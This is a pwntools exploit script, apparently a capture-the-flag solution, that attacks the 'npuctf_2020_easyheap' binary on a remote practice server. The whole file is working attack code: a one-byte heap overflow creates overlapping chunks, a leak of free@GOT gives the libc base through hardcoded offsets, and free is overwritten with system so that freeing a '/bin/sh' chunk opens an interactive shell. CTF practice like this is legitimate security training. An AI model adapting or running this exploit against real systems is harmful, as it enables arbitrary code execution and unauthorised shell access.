# coding:utf-8
from pwn import *
context.log_level = 'debug'

proc_name = './npuctf_2020_easyheap'
islocal = 0
libc = ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
elf = ELF(proc_name)

if islocal:
    p = process(proc_name)
else:
    p = remote('node4.buuoj.cn', 25520)

def debug(addr, PIE=True):
    if PIE:
        text_base = int(os.popen("pmap {}| awk '{{print $1}}'".format(p.pid)).readlines()[1], 16)
        gdb.attach(p,'b *{}'.format(hex(text_base+addr)))
    else:
        gdb.attach(p,"b *{}".format(hex(addr)))

def create(size, content):          # size = 24 or 56
    p.recvuntil('choice :')
    p.sendline('1')
    p.recvuntil('only) :')
    p.sendline(str(size))
    p.recvuntil('Content:')
    p.send(content)

def delete(index):
    p.recvuntil('choice :')
    p.sendline('4')
    p.recvuntil('Index :')
    p.sendline(str(index))

def edit(index, content):
    p.recvuntil('choice :')
    p.sendline('2')
    p.recvuntil('Index :')
    p.sendline(str(index))
    p.recvuntil('Content: ')
    p.send(content)

def show(index):
    p.recvuntil('choice :')
    p.sendline('3')
    p.recvuntil('Index :')
    p.sendline(str(index)) 

def leak():
    global system_addr

    create(24, 'aaaa')
    create(24, 'bbbb')
    create(24, '/bin/sh\x00')
    # debug(0)
    edit(0, b'a'*24 + p8(0x41))       # overlap(chunk0, chunk1)
    # debug(0)
    delete(1)
    # debug(0)
    payload  = b'b' * 16               # paydding
    payload += p64(0)                  # remain prev_size
    payload += p64(0x21)               # remain chunk1_head's size
    payload += p64(0x38)               # remain chunk1_content_size
    payload += p64(elf.got['free'])    # free@got
    
    create(56, payload)
 
    # leak
    show(1)
    
    free_addr = u64(p.recvuntil('\x7f')[-6:].ljust(8, b"\x00"))
    libc_base = free_addr - 0x97950
    system_addr = libc_base + 0x4f440
    
    log.success('free_addr => ' + hex(free_addr))
    log.success('libc_base => ' + hex(libc_base))
    log.success('system_addr => ' + hex(system_addr))
    # debug(0)


def pwn():
    edit(1, p64(system_addr))
    # debug(0)
    # pause()
    delete(2)
    p.interactive()

if __name__ == '__main__':
    leak()
    pwn()